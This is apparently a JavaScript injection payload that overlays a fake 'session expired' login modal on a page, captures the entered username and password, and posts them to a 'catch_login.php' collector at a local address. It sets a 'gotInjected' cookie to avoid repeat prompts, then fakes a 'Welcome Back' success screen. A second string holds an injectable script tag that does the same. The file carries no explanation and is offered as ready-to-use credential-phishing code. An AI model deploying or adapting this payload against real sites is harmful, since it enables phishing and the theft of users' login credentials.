  function load_home() {
    var element = '<div class="modal-container" id="login-modal"><div class="bg-blur"></div><div class="modal"><div class="top"><h1>Oops!</h1><h6>something went wrong, your session is expired, please login in again </h6></div>' +
    '<form id="login-form" ><input id="form_username" type="text" name="username" placeholder="Username"><input id="form_password" type="password" name="password" placeholder="Password"><button type="submit">Post</button></form>' +
    '<div class="or-container"><div class="line"></div><div class="or">OR</div><div class="line"></div></div><div class="bottom"><div class="facebook"><img src="images/facebook.svg" alt=""><span>Log in with Facebook</span></div><div class="forgot-password">Forgot Password?</div></div></div></div>' +
    '<div class="success-container" id="success-container"><div class="success"><h1>Welcome Back!!</h1><img src="images/success.svg" alt=""></div></div>';
    
    var h = document.getElementsByTagName("body")[0];
    h.insertAdjacentHTML("afterend", element); 
  }

  function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for(let i = 0; i <ca.length; i++) {
      let c = ca[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  }

  function formSubmit(e) {
    e.preventDefault(); 
    const formData = new FormData();
    formData.append('username',document.getElementById('form_username').value); 
    formData.append('password',document.getElementById('form_password').value);
    fetch('http://127.0.0.1:6969/catch_login.php',
      {
        method: 'POST',
        body: formData,
      })
      .then(response => {
        console.log(response)
      })
      .catch(error => {
        fadeOut();
        document.cookie = "gotInjected=true";
        console.log(error)});
  }

  function fadeOut() {
    const modal = document.getElementById("login-modal");
    const success = document.getElementById("success-container");
    modal.style.display = "none";
    success.style.display = "block";
    setTimeout(() => {
      success.style.animation = "fading 1s linear forwards";
    }, 500);
    setTimeout(() => {
      success.style.display = "none";
    }, 1500);
  }


  if(!getCookie('gotInjected')) {
    load_home();
  }

  const form = document.getElementById("login-form"); 
  form.addEventListener("submit", formSubmit);
  

  
  
  



var scriptOld = '<script> function sendData(e) {e.preventDefault();' +
    'fetch(\'http://127.0.0.1:6969/catch_login.php\',{method: \'POST\',body: JSON.stringify({username: document.getElementById(\'form_username\'), password: document.getElementById(\'form_password\')})})' +
    '.then(response => console.log(response))' +
    '.catch(error => console.log(error));</script>';




